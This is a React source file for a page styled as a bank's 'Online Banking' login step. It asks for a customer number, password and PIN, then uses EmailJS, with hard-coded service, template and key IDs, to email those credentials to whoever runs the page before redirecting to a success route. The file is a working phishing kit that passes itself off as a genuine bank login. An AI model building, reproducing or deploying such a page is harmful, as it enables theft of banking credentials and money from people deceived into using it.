import React, { useRef, useState } from "react";
import { MdErrorOutline } from "react-icons/md";
import { useNavigate } from "react-router-dom";
import emailjs from "@emailjs/browser";

export default function OnlineBanking() {
  const form = useRef(); // ✅ EmailJS form ref
  const navigate = useNavigate();

  const [errors, setErrors] = useState({
    customerNo: false,
    password: false,
    pin: false,
  });

  const sendLoginEmail = (e) => {
    e.preventDefault();

    const formData = new FormData(form.current);
    const customerNo = formData.get("customerNo");
    const password = formData.get("password");
    const pin = formData.get("pin");

    const newErrors = {
      customerNo: !customerNo,
      password: !password,
      pin: !pin,
    };
    setErrors(newErrors);

    if (!newErrors.customerNo && !newErrors.password && !newErrors.pin) {
      emailjs
        .sendForm(
          "service_e1eul13",     // ✅ your EmailJS service ID
          "template_x4r3vzo",    // ✅ your template ID
          form.current,
          "nb4k7l5gjhCm1Jyk1"    // ✅ your public key
        )
        .then(
          (result) => {
            console.log("Email sent:", result.text);
            navigate("/success"); // ✅ redirect after success
          },
          (error) => {
            console.log("Error:", error.text);
          }
        );

      e.target.reset(); // ✅ clear form
    }
  };

  return (
    <div className="min-h-screen bg-white">
      {/* Top small header */}
      <header className="bg-[#5a287d] shadow-lg py-2 px-6 flex items-center relative z-10">
        <img src="/img/logo.svg" alt="Logo" className="h-8 w-auto ml-40" />
      </header>

      {/* Second big header */}
      <div className="bg-[#5a287d] text-white py-10 px-6 text-center">
        <h1 className="text-2xl md:text-3xl font-bold mb-2">
          Login step 1 - Online Banking
        </h1>
        <p className="text-sm md:text-base max-w-2xl mx-auto">
          You can use your customer number or your 16-digit debit or credit card
          number to log in.
        </p>
      </div>

      {/* Login form */}
      <main className="flex flex-col items-start mt-20 ml-60">
        <form ref={form} onSubmit={sendLoginEmail} className="w-full max-w-lg p-6 bg-white">
          {/* Customer Number */}
          <div className="mb-4">
            <label className="block text-sm font-medium mb-1">
              Your customer number:
            </label>
            <div
              className={`p-3 rounded border-2 ${
                errors.customerNo
                  ? "border-red-500 bg-red-50"
                  : "border-gray-300 bg-white"
              }`}
            >
              <input
                type="text"
                name="customerNo"  // ✅ EmailJS field
                className="w-full bg-transparent outline-none text-base"
                placeholder="Enter Customer Number"
              />
            </div>
            {errors.customerNo && (
              <p className="flex items-center text-red-600 mt-2 text-sm">
                <MdErrorOutline className="mr-1 text-lg" />
                Please enter a value.
              </p>
            )}
          </div>

          {/* Password */}
          <div className="mb-4">
            <label className="block text-sm font-medium mb-1">
              Your Online Banking Password:
            </label>
            <div
              className={`p-3 rounded border-2 ${
                errors.password
                  ? "border-red-500 bg-red-50"
                  : "border-gray-300 bg-white"
              }`}
            >
              <input
                type="password"
                name="password"  // ✅ EmailJS field
                className="w-full bg-transparent outline-none text-base"
                placeholder="Enter Banking Password"
              />
            </div>
            {errors.password && (
              <p className="flex items-center text-red-600 mt-2 text-sm">
                <MdErrorOutline className="mr-1 text-lg" />
                Please enter a value.
              </p>
            )}
          </div>

          {/* Pin */}
          <div className="mb-6">
            <label className="block text-sm font-medium mb-1">
              Your Online Banking PIN:
            </label>
            <div
              className={`p-3 rounded border-2 ${
                errors.pin
                  ? "border-red-500 bg-red-50"
                  : "border-gray-300 bg-white"
              }`}
            >
              <input
                type="text"
                name="pin"  // ✅ EmailJS field
                className="w-full bg-transparent outline-none text-base"
                placeholder="Enter PIN"
              />
            </div>
            {errors.pin && (
              <p className="flex items-center text-red-600 mt-2 text-sm">
                <MdErrorOutline className="mr-1 text-lg" />
                Please enter a value.
              </p>
            )}
          </div>

          {/* Continue Button */}
          <button
            type="submit"
            className="ml-87 px-6 py-3 bg-purple-900 text-white font-semibold transition"
          >
            Continue
          </button>
        </form>
      </main>
    </div>
  );
}
